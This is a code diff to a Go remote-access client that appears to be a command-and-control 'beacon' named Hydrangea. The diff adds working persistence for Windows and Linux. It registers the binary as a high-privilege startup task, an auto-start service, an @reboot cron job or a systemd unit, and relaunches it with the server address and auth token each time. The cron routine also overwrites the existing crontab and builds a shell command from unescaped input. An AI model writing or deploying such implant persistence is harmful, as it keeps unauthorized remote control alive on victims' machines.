@@ -336,11 +336,11 @@ func handleSession(conn net.Conn, root string, hdr Header) {
 	info := map[string]any{
 		"platform":  fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH),
 		"system":    runtime.GOOS,
-		"release":   "-",               // not easily portable
-		"version":   runtime.Version(), // Go runtime version
+		"release":   "-",               
+		"version":   runtime.Version(), 
 		"machine":   runtime.GOARCH,
 		"processor": runtime.GOARCH,
-		"python":    "-", // keep key for controller UI
+		"python":    "-",
 		"pid":       os.Getpid(),
 		"user": func() string {
 			if u != nil {
@@ -427,6 +427,173 @@ func handlePortForward(conn net.Conn, root string, hdr Header, _ []byte) {
         _ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: started %s", target)}, nil)
 }
 
+// ---------- persistence scheduling ----------
+
+// -- Windows
+
+func schedule_task_windows(ip string, port int, token, clientID, root string) error {
+	// get the current executable path
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	// create a scheduled task to run at device startup
+	taskName := "Hydrangea"
+	// Create command with environment variable arguments that will be populated at runtime
+	args := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root \"%s\"", ip, port, token, clientID, root)
+	cmd := exec.Command("schtasks", "/Create", "/SC", "ONSTART", "/TN", taskName, "/TR",
+		fmt.Sprintf("\"%s\" %s", exePath, args), "/RL", "HIGHEST", "/F")
+	
+	var outBuf, errBuf bytes.Buffer
+	cmd.Stdout = &outBuf
+	cmd.Stderr = &errBuf
+	
+	err = cmd.Run()
+	if err != nil {
+		return fmt.Errorf("failed to create scheduled task: %v (stderr: %s)", err, errBuf.String())
+	}
+	
+	return nil
+}
+
+func schedule_task_windows_svc(ip string, port int, token, clientID, root string) error {
+	// get the current executable path
+	exePath, err := os.Executable()
+
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	// create a Windows service using sc.exe
+	serviceName := "Hydrangea"
+	args := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root \"%s\"", ip, port, token, clientID, root)
+	cmd := exec.Command("sc", "create", serviceName, "binPath=", fmt.Sprintf("\"%s %s\"", exePath, args), "start=", "auto")
+	var outBuf, errBuf bytes.Buffer
+	cmd.Stdout = &outBuf
+	cmd.Stderr = &errBuf
+	err = cmd.Run()
+	if err != nil {
+		return fmt.Errorf("failed to create service: %v (stderr: %s)", err, errBuf.String())
+	}
+
+	// start the service
+	cmd = exec.Command("sc", "start", serviceName)
+	outBuf.Reset()
+	errBuf.Reset()
+
+	cmd.Stdout = &outBuf
+	cmd.Stderr = &errBuf
+	err = cmd.Run()	
+
+	if err != nil {
+		return fmt.Errorf("failed to start service: %v (stderr: %s)", err, errBuf.String())
+	}
+
+	return nil
+}
+
+// -- Linux
+
+func schedule_task_unix(ip string, port int, token, clientID, root string) error {
+	// get the current executable path
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	// create a cron job that runs at reboot
+	cronEntry := fmt.Sprintf("@reboot \"%s\" --server %s --port %d --auth-token %s --client-id %s --root \"%s\"\n",
+		exePath, ip, port, token, clientID, root)
+
+	// write the cron job to the crontab
+	cmd := exec.Command("bash", "-c", fmt.Sprintf("echo \"%s\" | crontab -", cronEntry))
+	
+	var outBuf, errBuf bytes.Buffer
+	cmd.Stdout = &outBuf
+	cmd.Stderr = &errBuf
+	
+	err = cmd.Run()
+	if err != nil {
+		return fmt.Errorf("failed to create cron job: %v (stderr: %s)", err, errBuf.String())
+	}
+	
+	return nil
+}
+
+func schedule_task_unix_svc(ip string, port int, token, clientID, root string) error {
+	// get the current executable path
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	// create a systemd service file
+	serviceContent := fmt.Sprintf(`[Unit]
+	Description=Hydrangea Service
+	After=network.target
+	[Service]
+	Type=simple
+	ExecStart=%s --server %s --port %d --auth-token %s --client-id %s --root %s
+	Restart=on-failure
+	[Install]
+	WantedBy=multi-user.target
+	`, exePath, ip, port, token, clientID, root)
+
+	servicePath := "/etc/systemd/system/hydrangea.service"
+	if err := os.WriteFile(servicePath, []byte(serviceContent), 0o644); err != nil {
+		return fmt.Errorf("failed to write service file: %v", err)
+	}
+
+	// enable and start the service
+	cmd := exec.Command("systemctl", "enable", "--now", "hydrangea.service")
+	var outBuf, errBuf bytes.Buffer
+	cmd.Stdout = &outBuf
+	cmd.Stderr = &errBuf
+
+	err = cmd.Run()
+	if err != nil {
+		return fmt.Errorf("failed to enable/start service: %v (stderr: %s)", err, errBuf.String())
+	}
+
+	return nil
+}
+
+// -- common
+
+func schedule_persistence(ip string, port int, token, clientID, root string) {
+	var err error
+	if runtime.GOOS == "windows" {
+		// Try to create a service first
+		err = schedule_task_windows_svc(ip, port, token, clientID, root)
+		if err != nil {
+			// Fallback to scheduled task if service creation fails
+			err = schedule_task_windows(ip, port, token, clientID, root)
+		}
+	} else {
+		// Try to create a systemd service first
+		err = schedule_task_unix_svc(ip, port, token, clientID, root)
+		if err != nil {
+			// Fallback to cron job if service creation fails
+			err = schedule_task_unix(ip, port, token, clientID, root)
+		}
+	}
+	if err != nil {
+		fmt.Printf("Persistence scheduling failed: %v\n", err)
+	} else {
+		fmt.Println("Persistence scheduling succeeded.")
+	}
+}
+
+func debugPrint(ip string, port int, token, clientID, root string) {
+	// print the content of variables
+	fmt.Printf("Server: %s\n", ip)
+	fmt.Printf("Port: %d\n", port)
+	fmt.Printf("Auth Token: %s\n", token)
+	fmt.Printf("Client ID: %s\n", clientID)
+	fmt.Printf("Root: %s\n", root)
+}
+
 // ---------- main loop ----------
 
 func main() {
@@ -442,7 +609,14 @@ func main() {
 	clientID := flag.String("client-id", DefaultClientID, "Client ID (default: hostname)")
 	root := flag.String("root", DefaultRootBase, "Base directory for relative paths")
 	testConnection := flag.Bool("test-connection", false, "Test connection to server and exit")
+	persist := flag.Bool("persist", false, "Schedule persistence on the system (requires appropriate permissions)")
+	debug := flag.Bool("debug", false, "Print debug info and exit")
 	flag.Parse()
+
+	if *debug {
+		debugPrint(*server, *port, *token, *clientID, *root)
+		os.Exit(0)
+	}
 
 	id := *clientID
 	if id == "" || id == "default-hydrangea-beacon" {
@@ -473,6 +647,11 @@ func main() {
 		}
 
 		fmt.Println("Connection test successful!")
+		os.Exit(0)
+	}
+
+	if *persist {
+		schedule_persistence(*server, *port, *token, id, *root)
 		os.Exit(0)
 	}
 
